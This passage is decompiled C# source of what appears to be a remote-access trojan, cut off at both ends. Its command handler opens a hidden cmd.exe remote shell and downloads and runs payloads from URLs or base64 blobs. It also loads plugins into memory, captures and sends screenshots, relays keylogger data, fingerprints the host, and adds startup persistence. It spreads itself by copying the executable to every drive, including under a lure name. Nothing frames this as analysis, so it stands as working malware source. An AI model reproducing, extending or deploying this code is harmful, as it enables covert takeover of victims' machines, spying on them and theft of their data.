		NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return (Array)NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	public byte[] method_13(byte[] byte_0, ref bool bool_18)
	{
		checked
		{
			object[] array5;
			bool[] array3;
			if (bool_18)
			{
				object obj = new MemoryStream();
				object obj2 = new GZipStream((Stream)obj, CompressionMode.Compress, leaveOpen: true);
				object[] array = new object[3] { byte_0, 0, byte_0.Length };
				object[] array2 = array;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
				byte[] array4 = new byte[Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)) + 1];
				array5 = new object[3] { array4, 0, array4.Length };
				object[] array6 = array5;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj, (Type)null, "Read", array6, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				return array4;
			}
			object obj3 = new MemoryStream(byte_0);
			object obj4 = new GZipStream((Stream)obj3, CompressionMode.Decompress);
			byte[] array7 = new byte[4];
			NewLateBinding.LateSet(obj3, (Type)null, "Position", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj3, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
			array5 = new object[3] { array7, 0, 4 };
			object[] array8 = array5;
			array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj3, (Type)null, "Read", array8, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array7 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			int num = BitConverter.ToInt32(array7, 0);
			NewLateBinding.LateSet(obj3, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
			byte[] array9 = new byte[num - 1 + 1];
			array5 = new object[3] { array9, 0, num };
			object[] array10 = array5;
			array3 = new bool[3] { true, false, true };
			NewLateBinding.LateCall(obj4, (Type)null, "Read", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array9 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			if (array3[2])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[2]), typeof(int));
			}
			NewLateBinding.LateCall(obj4, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			return array9;
		}
	}

	[DllImport("psapi")]
	public static extern bool EmptyWorkingSet(long long_0);

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_4, ref int int_5, int int_6);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_4, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_5);

	public bool method_14()
	{
		checked
		{
			try
			{
				string string_ = Strings.Space(100);
				int num = 0;
				do
				{
					short short_ = (short)num;
					string string_2 = null;
					if (!capGetDriverDescriptionA(short_, ref string_, 100, ref string_2, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint uint_0, uint uint_1, [Out] StringBuilder stringBuilder_0, int int_4);

	public string method_15(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			int localeInfo = GetLocaleInfo(1024u, uint_0, stringBuilder, stringBuilder.Capacity);
			if (localeInfo > 0)
			{
				return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "X";
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_4);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_4);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long long_0);

	public string method_16()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					string string_ = " ";
					return method_7(ref string_);
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string string_2 = Strings.StrDup(windowTextLengthA + 1, "*");
				GetWindowTextA(foregroundWindow, ref string_2, windowTextLengthA + 1);
				int int_ = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref int_);
				if (int_ != 0)
				{
					try
					{
						string string_ = Process.GetProcessById(int_).MainWindowTitle;
						return method_7(ref string_);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = method_7(ref string_2);
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return method_7(ref string_2);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string string_ = " ";
				string result = method_7(ref string_);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_4, ref int int_5, ref int int_6, ref int int_7, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_8);

	public string method_17()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[STAThread]
	public static void Main()
	{
		GClass0 gClass = new GClass0();
		gClass.method_1();
	}

	private void method_18()
	{
		method_24(0);
	}

	public object method_19(byte[] byte_0, string string_11)
	{
		object obj = Assembly.Load(byte_0);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return NewLateBinding.LateGet(obj, (Type)null, "CreateInstance", new object[1] { Strings.Split(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), ",", -1, (CompareMethod)0)[0] + "." + string_11 }, (string[])null, (Type[])null, (bool[])null);
	}

	private void method_20(object object_4, object object_5)
	{
		try
		{
			string text = string_8;
			string string_ = Conversions.ToString(NewLateBinding.LateGet(object_5, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text2 = method_7(ref string_);
			NewLateBinding.LateSetComplex(object_5, (Type)null, "Data", new object[1] { string_ }, (string[])null, (Type[])null, true, false);
			method_26("rs" + text + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_21()
	{
		try
		{
			method_26("rsc");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr SendMessageW(IntPtr intptr_0, int int_4, IntPtr intptr_1, IntPtr intptr_2);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_22(byte[] byte_0)
	{
		//IL_0b22: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b29: Expected O, but got Unknown
		string[] array = Strings.Split(method_11(ref byte_0), string_8, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "rss":
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					object_1 = new Process();
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardOutput", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardInput", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "FileName", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
					((Process)object_1).OutputDataReceived += method_20;
					((Process)object_1).ErrorDataReceived += method_20;
					((Process)object_1).Exited += delegate
					{
						method_21();
					};
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "UseShellExecute", new object[1] { false }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateNoWindow", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSet(object_1, (Type)null, "EnableRaisingEvents", new object[1] { true }, (string[])null, (Type[])null);
					method_26("rss");
					NewLateBinding.LateCall(object_1, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(object_1, (Type)null, "BeginErrorReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(object_1, (Type)null, "BeginOutputReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "rs":
					NewLateBinding.LateCall(NewLateBinding.LateGet(object_1, (Type)null, "StandardInput", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WriteLine", new object[1] { method_8(ref array[1]) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "rsc":
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					object_1 = null;
					break;
				case "kl":
					method_26("kl" + string_8 + method_7(ref gclass1_0.string_1));
					break;
				case "inf":
				{
					string text12 = "inf" + string_8;
					if (Operators.CompareString(method_3("vn"), "", false) == 0)
					{
						string text13 = text12;
						string string_2 = method_8(ref string_0) + "_" + method_17();
						text12 = text13 + method_7(ref string_2) + string_8;
					}
					else
					{
						string text14 = text12;
						string string_2 = method_3("vn");
						string string_ = method_8(ref string_2) + "_" + method_17();
						text12 = text14 + method_7(ref string_) + string_8;
					}
					text12 = text12 + string_6 + ":" + string_7 + string_8;
					text12 = text12 + string_4 + string_8;
					text12 = text12 + string_3 + string_8;
					text12 += Process.GetCurrentProcess().ProcessName;
					method_26(text12);
					break;
				}
				case "prof":
				{
					string text11 = array[1];
					if (Operators.CompareString(text11, "~", false) == 0)
					{
						method_4(array[2], array[3]);
					}
					else if (Operators.CompareString(text11, "!", false) == 0)
					{
						method_4(array[2], array[3]);
						method_26("getvalue" + string_8 + array[1] + string_8 + method_3(array[1]));
					}
					else if (Operators.CompareString(text11, "~", false) == 0)
					{
						method_2(array[2]);
					}
					break;
				}
				case "rn":
				{
					byte[] array35 = null;
					if (!array[2].ToLower().StartsWith("http"))
					{
						byte[] byte_3 = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						array35 = method_13(byte_3, ref bool_);
					}
					else
					{
						object obj6 = new WebClient();
						object[] array36 = new object[1];
						object[] array37 = array36;
						string[] array9 = array;
						string[] array38 = array9;
						int num2 = 2;
						array37[0] = array38[2];
						object[] array13 = array36;
						object[] array39 = array13;
						bool[] array15 = new bool[1] { true };
						object obj7 = NewLateBinding.LateGet(obj6, (Type)null, "DownloadData", array39, (string[])null, (Type[])null, array15);
						if (array15[0])
						{
							array9[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array13[0]), typeof(string));
						}
						array35 = (byte[])obj7;
					}
					method_26("bla");
					string text9 = Interaction.Environ("temp") + "\\" + method_9(10) + "." + array[1];
					File.WriteAllBytes(text9, array35);
					Process.Start(text9);
					break;
				}
				case "inv":
				{
					method_26("bla");
					string text8 = method_3(array[1]);
					byte[] array34;
					if (text8.Length > 0)
					{
						array34 = Convert.FromBase64String(text8);
						method_26("pl" + string_8 + array[1] + string_8 + Conversions.ToString(0));
					}
					else
					{
						if (array[3].Length == 1)
						{
							method_26("pl" + string_8 + array[1] + string_8 + "False");
							break;
						}
						byte[] byte_2 = Convert.FromBase64String(array[3]);
						bool bool_ = false;
						array34 = method_13(byte_2, ref bool_);
						if (Conversions.ToBoolean(method_4(array[1], Convert.ToBase64String(array34))))
						{
							method_26("pl" + string_8 + array[1] + string_8 + Conversions.ToString(0));
						}
					}
					object objectValue4 = RuntimeHelpers.GetObjectValue(method_19(array34, "A"));
					NewLateBinding.LateSet(objectValue4, (Type)null, "h", new object[1] { string_6 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue4, (Type)null, "p", new object[1] { string_7 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue4, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue4, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(!bool_17), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue4, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(objectValue4, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
					break;
				}
				case "ret":
				{
					method_26("bla");
					string text10 = method_3(array[1]);
					byte[] array42;
					if (text10.Length > 0)
					{
						array42 = Convert.FromBase64String(text10);
						method_26("pl" + string_8 + array[1] + string_8 + Conversions.ToString(0));
					}
					else
					{
						if (array[2].Length == 1)
						{
							method_26("pl" + string_8 + array[1] + string_8 + "True");
							break;
						}
						byte[] byte_4 = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						array42 = method_13(byte_4, ref bool_);
						if (Conversions.ToBoolean(method_4(array[1], Convert.ToBase64String(array42))))
						{
							method_26("pl" + string_8 + array[1] + string_8 + Conversions.ToString(0));
						}
					}
					object objectValue5 = RuntimeHelpers.GetObjectValue(method_19(array42, "A"));
					string[] array9 = new string[5]
					{
						"ret",
						string_8,
						array[1],
						string_8,
						null
					};
					string[] array43 = array9;
					string string_ = Conversions.ToString(NewLateBinding.LateGet(objectValue5, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
					array43[4] = method_7(ref string_);
					method_26(string.Concat(array9));
					break;
				}
				case "CAP":
				{
					int width = Screen.get_PrimaryScreen().get_Bounds().Width;
					Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(width, rectangle.Height);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						Cursor @default = Cursors.get_Default();
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						rectangle = new Rectangle(position, size);
						@default.Draw(val2, rectangle);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					val2.Dispose();
					MemoryStream memoryStream = new MemoryStream();
					string string_ = "CAP" + string_8;
					byte_0 = method_10(ref string_);
					memoryStream.Write(byte_0, 0, byte_0.Length);
					MemoryStream memoryStream2 = new MemoryStream();
					IntPtr intPtr = default(IntPtr);
					((Image)val).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
					memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
					method_25(memoryStream.ToArray());
					memoryStream.Dispose();
					memoryStream2.Dispose();
					((Image)val).Dispose();
					break;
				}
				case "oaoa":
					try
					{
						File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe", overwrite: true);
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						break;
					}
				case "oaoa1":
				{
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "SpecialFolders", new object[1] { "Startup" }, (string[])null, (Type[])null, (bool[])null));
					object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { Operators.ConcatenateObject(objectValue2, (object)"\\G954KIOR9943KJ-4UJFDK8KJNER89IJKWS-4I9KD-329893KJD.lnk") }, (string[])null, (Type[])null, (bool[])null));
					NewLateBinding.LateSet(objectValue3, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\G954KIOR9943KJ-4UJFDK8KJNER89IJKWS-4I9KD-329893KJD.EXE" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue3, (Type)null, "WorkingDirectory", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\G954KIOR9943KJ-4UJFDK8KJNER89IJKWS-4I9KD-329893KJD.EXE" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue3, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue3, (Type)null, "IconLocation", new object[1] { "%SystemRoot%\\system32\\SHELL32.dll,88" }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue3, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					DriveInfo[] drives = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo in drives)
					{
						string text6 = driveInfo.ToString() + ",";
						string[] array33 = Strings.Split(text6, ",", -1, (CompareMethod)0);
						string text7 = "G954KIOR9943KJ-4UJFDK8KJNER89IJKWS-4I9KD-329893KJD.EXE";
						int num5 = array33.Rank - 1;
						for (int j = 0; j <= num5; j++)
						{
							File.Copy(Application.get_ExecutablePath(), array33[j] + text7, overwrite: true);
						}
					}
					break;
				}
				case "kskskskskskks":
				{
					File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe", overwrite: true);
					object objectValue6 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					objectValue6 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue6, (Type)null, "SpecialFolders", new object[1] { "Startup" }, (string[])null, (Type[])null, (bool[])null));
					object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue6, (Type)null, "CreateShortcut", new object[1] { Operators.ConcatenateObject(objectValue7, (object)"\\898ERIFDJK834-39W49SBJ23-SD89HKJMNSD-3W9.lnk") }, (string[])null, (Type[])null, (bool[])null));
					NewLateBinding.LateSet(objectValue8, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue6, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\898ERIFDJK834-39W49SBJ23-SD89HKJMNSD-3W9.EXE" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue8, (Type)null, "WorkingDirectory", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue6, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\898ERIFDJK834-39W49SBJ23-SD89HKJMNSD-3W9.EXE" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue8, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue8, (Type)null, "IconLocation", new object[1] { "%SystemRoot%\\system32\\SHELL32.dll,88" }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue8, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					DriveInfo[] drives2 = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo2 in drives2)
					{
						string text15 = driveInfo2.ToString() + ",";
						string[] array44 = Strings.Split(text15, ",", -1, (CompareMethod)0);
						string text16 = "898ERIFDJK834-39W49SBJ23-SD89HKJMNSD-3W9.EXE";
						string text17 = "SEX.pif";
						int num8 = array44.Rank - 1;
						for (int l = 0; l <= num8; l++)
						{
							File.Copy(Application.get_ExecutablePath(), array44[l] + text16, overwrite: true);
							File.Copy(Application.get_ExecutablePath(), array44[l] + text17, overwrite: true);
						}
					}
					break;
				}
				case "nextok":
					webBrowser_0.Navigate("http://www.pacdv.com/sounds/voices/go-head.wav");
					break;
				case "sd0oson":
				{
					string string_ = "Shell_traywnd";
					string string_2 = "";
					long num7 = FindWindowA(ref string_, ref string_2);
					SetWindowPos((int)num7, 0, 0, 0, 0, 0, 128);
					break;
				}
				case "sd0oson1":
				{
					string string_ = "Shell_traywnd";
					string string_2 = "";
					long num6 = FindWindowA(ref string_, ref string_2);
					SetWindowPos((int)num6, 0, 0, 0, 0, 0, 64);
					break;
				}
				case "muaon":
				{
					bool_0 = !bool_0;
					IntPtr intptr_2 = method_0();
					ShowWindow(intptr_2, (!bool_0) ? 5 : 0);
					break;
				}
				case "muaon2":
				{
					bool_0 = !bool_0;
					IntPtr intptr_ = method_0();
					ShowWindow(intptr_, (!bool_0) ? 5 : 0);
					break;
				}
				case "Shutdown1":
					Process.Start("shutdown", "-s");
					break;
				case "Restart1":
					Process.Start("shutdown", "-r");
					break;
				case "LogOff1":
					Process.Start("shutdown", "-l");
					break;
				case "stoppema":
					BlockInput(bool_18: true);
					Thread.Sleep(600000);
					break;
				case "stoppema2":
					BlockInput(bool_18: false);
					break;
				case "sex1":
					try
					{
						Process.Start("Bubbles.scr");
						break;
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
						break;
					}
				case "sex2":
					try
					{
						Process.Start("Ribbons.scr");
						break;
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
						break;
					}
				case "sex3":
					try
					{
						Process.Start("Mystify.scr");
						break;
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						break;
					}
				case "sex4":
					try
					{
						Process.Start("PhotoScreensaver.scr");
						break;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
						break;
					}
				case "sex5":
					try
					{
						Process.Start("ssText3d.scr");
						break;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
						break;
					}
				case "P":
					method_26("P");
					break;
				case "un":
					switch (array[1])
					{
					case "~":
						method_28();
						break;
					case "!":
						method_24(0);
						ProjectData.EndApp();
						break;
					case "@":
					{
						method_24(0);
						Type typeFromHandle = typeof(Process);
						object[] array13 = new object[1];
						object[] array40 = array13;
						object obj8 = object_0;
						array40[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj8, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null));
						object[] array36 = array13;
						object[] array41 = array36;
						bool[] array15 = new bool[1] { true };
						NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array41, (string[])null, (Type[])null, array15, true);
						if (array15[0])
						{
							NewLateBinding.LateSetComplex(obj8, (Type)null, "FullName", new object[1] { RuntimeHelpers.GetObjectValue(array36[0]) }, (string[])null, (Type[])null, true, false);
						}
						ProjectData.EndApp();
						break;
					}
					}
					break;
				case "up":
				{
					byte[] array29 = null;
					if (!array[1].ToLower().StartsWith("http"))
					{
						byte[] byte_ = Convert.FromBase64String(array[1]);
						bool bool_ = false;
						array29 = method_13(byte_, ref bool_);
					}
					else
					{
						object obj4 = new WebClient();
						object[] array6 = new object[1];
						object[] array30 = array6;
						string[] array9 = array;
						string[] array31 = array9;
						int num2 = 1;
						array30[0] = array31[1];
						object[] array13 = array6;
						object[] array32 = array13;
						bool[] array15 = new bool[1] { true };
						object obj5 = NewLateBinding.LateGet(obj4, (Type)null, "DownloadData", array32, (string[])null, (Type[])null, array15);
						if (array15[0])
						{
							array9[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array13[0]), typeof(string));
						}
						array29 = (byte[])obj5;
					}
					method_26("bla");
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "" }, (string[])null, (Type[])null, (bool[])null, true);
					string text5 = Interaction.Environ("temp") + "\\" + method_9(10) + ".exe";
					File.WriteAllBytes(text5, array29);
					Process.Start(text5, "UP:" + Conversions.ToString(Process.GetCurrentProcess().Id));
					int num4 = 0;
					do
					{
						Thread.Sleep(10);
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValue", new object[2] { "di", "" }, (string[])null, (Type[])null, (bool[])null), (object)"!", false))
						{
							method_28();
						}
						num4++;
					}
					while (num4 <= 500);
					break;
				}
				case "RG":
				{
					object obj = method_23(array[2]);
					switch (array[1])
					{
					case "~":
					{
						string text = "RG" + string_8 + "~" + string_8 + array[2] + string_8;
						string text2 = "";
						IEnumerator enumerator = default(IEnumerator);
						try
						{
							enumerator = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "GetSubKeyNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator.MoveNext())
							{
								string text3 = Conversions.ToString(enumerator.Current);
								if (!text3.Contains("\\"))
								{
									text2 = text2 + text3 + string_8;
								}
							}
						}
						finally
						{
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						IEnumerator enumerator2 = default(IEnumerator);
						try
						{
							enumerator2 = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
